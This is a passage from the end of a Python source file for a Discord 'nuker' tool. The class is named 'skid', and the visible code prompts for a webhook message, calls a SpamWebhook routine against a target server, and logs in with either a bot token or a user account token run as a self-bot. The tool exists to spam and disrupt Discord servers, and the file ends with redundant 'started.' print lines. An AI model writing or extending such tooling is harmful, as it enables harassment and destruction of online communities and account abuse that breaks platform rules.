            message = str(input(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.WHITE}{ok}{Fore.WHITE}{self.colour}] {self.colour}[{self.colour}{Fore.WHITE}Client{Fore.WHITE}{self.colour}] {Fore.LIGHTBLACK_EX} Webhook Message: {self.colour}"))
            await self.SpamWebhook(guild_id, amount, message) 
            time.sleep(3)
            await self.Menu() 
    
##################^^^END CHOISE^^^##################

#################################################################################^^^ NUKER MAIN MENU END^^^###################################################################################################################


##################################################################################vvv END vvv###################################################################################################################

    @client.event
    async def on_ready():
        await skid().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour}Token Was Invalid {Fore.LIGHTBLACK_EX}')
            input()
            os._exit(0)

if __name__ == "__main__":
    skid().Startup()


print("started.")
print("started.")
print("started.")
print("welcome.")

##################################################################################^^^ END ^^^###################################################################################################################